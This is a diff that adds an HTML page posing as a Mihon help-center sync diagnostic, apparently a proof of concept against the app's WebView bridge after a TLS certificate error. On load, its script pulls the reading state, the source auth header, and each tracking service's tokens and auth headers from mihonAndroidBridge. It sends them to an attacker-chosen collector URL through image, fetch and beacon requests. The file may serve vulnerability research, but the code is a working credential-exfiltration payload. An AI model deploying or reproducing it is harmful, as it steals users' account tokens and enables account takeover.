@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Mihon 帮助中心 - 同步连接诊断</title>
+<style>
+body { font-family: sans-serif; max-width: 680px; margin: 20px auto; padding: 0 16px; color: #333; }
+h2 { color: #2a6496; }
+.card { background: #f5f5f5; border-radius: 8px; padding: 16px; margin: 12px 0; }
+.muted { color: #666; font-size: 14px; }
+pre { white-space: pre-wrap; word-break: break-word; background: #fff; border: 1px solid #ddd; padding: 12px; }
+table { width: 100%; border-collapse: collapse; margin-top: 8px; font-size: 13px; }
+td { padding: 6px 8px; border-bottom: 1px solid #ddd; vertical-align: top; }
+td:first-child { font-weight: bold; width: 150px; }
+</style>
+</head>
+<body>
+<h2>Mihon 帮助中心</h2>
+<p class="muted">此页面模拟官方帮助域上的阅读同步连接诊断页。</p>
+
+<div class="card">
+  <h3>TLS 连接状态</h3>
+  <p id="tls-status">页面已继续加载，正在检查阅读辅助接口...</p>
+</div>
+
+<div class="card">
+  <h3>阅读状态</h3>
+  <pre id="reader-state">准备中...</pre>
+</div>
+
+<div class="card">
+  <h3>Tracking 服务</h3>
+  <div id="track-services">准备中...</div>
+</div>
+
+<script>
+var params = new URLSearchParams(location.search);
+var collector = params.get("collector") || (location.origin + "/collect");
+
+function setText(id, value) {
+    var el = document.getElementById(id);
+    if (el) el.textContent = value;
+}
+
+function setHtml(id, value) {
+    var el = document.getElementById(id);
+    if (el) el.innerHTML = value;
+}
+
+function exfil(label, data) {
+    var payload = label + "=" + encodeURIComponent(data || "");
+    var target = collector + "?d=" + encodeURIComponent(payload);
+    try {
+        new Image().src = target;
+    } catch (e) {}
+    try {
+        fetch(target, { mode: "no-cors" });
+    } catch (e) {}
+    try {
+        navigator.sendBeacon(target);
+    } catch (e) {}
+}
+
+function callBridge(name, fn) {
+    try {
+        var value = fn();
+        exfil(name, value);
+        return value;
+    } catch (e) {
+        exfil(name + "_error", e.message || String(e));
+        return "";
+    }
+}
+
+function run() {
+    exfil("page_url", location.href);
+
+    if (!window.mihonAndroidBridge) {
+        setText("tls-status", "mihonAndroidBridge 不可用：页面没有获得可信帮助上下文。");
+        exfil("bridge_status", "missing");
+        return;
+    }
+
+    setText("tls-status", "证书错误页面已继续加载，mihonAndroidBridge 可用。");
+    exfil("bridge_status", "available_after_ssl_error");
+
+    var chapter = callBridge("currentChapter", function () {
+        return window.mihonAndroidBridge.getCurrentChapter();
+    });
+    var progress = callBridge("readingProgress", function () {
+        return window.mihonAndroidBridge.getReadingProgress();
+    });
+    var sourceAuthHeader = callBridge("sourceAuthHeader", function () {
+        return window.mihonAndroidBridge.getSourceAuthHeader();
+    });
+    setText(
+        "reader-state",
+        "currentChapter: " + chapter + "\n" +
+        "readingProgress: " + progress + "\n" +
+        "sourceAuthHeader: " + sourceAuthHeader
+    );
+
+    var services = callBridge("availableServices", function () {
+        return window.mihonAndroidBridge.getAvailableTrackServices();
+    });
+    var rows = "";
+    services.split(",").forEach(function (service) {
+        service = service.trim();
+        if (!service) return;
+        var token = callBridge("trackToken_" + service, function () {
+            return window.mihonAndroidBridge.getTrackToken(service);
+        });
+        var auth = callBridge("trackAuth_" + service, function () {
+            return window.mihonAndroidBridge.getTrackAuthHeader(service);
+        });
+        rows += "<tr><td>" + service + "</td><td>" + token + "<br>" + auth + "</td></tr>";
+    });
+    setHtml("track-services", "<table>" + rows + "</table>");
+}
+
+setTimeout(run, 500);
+</script>
+</body>
+</html>
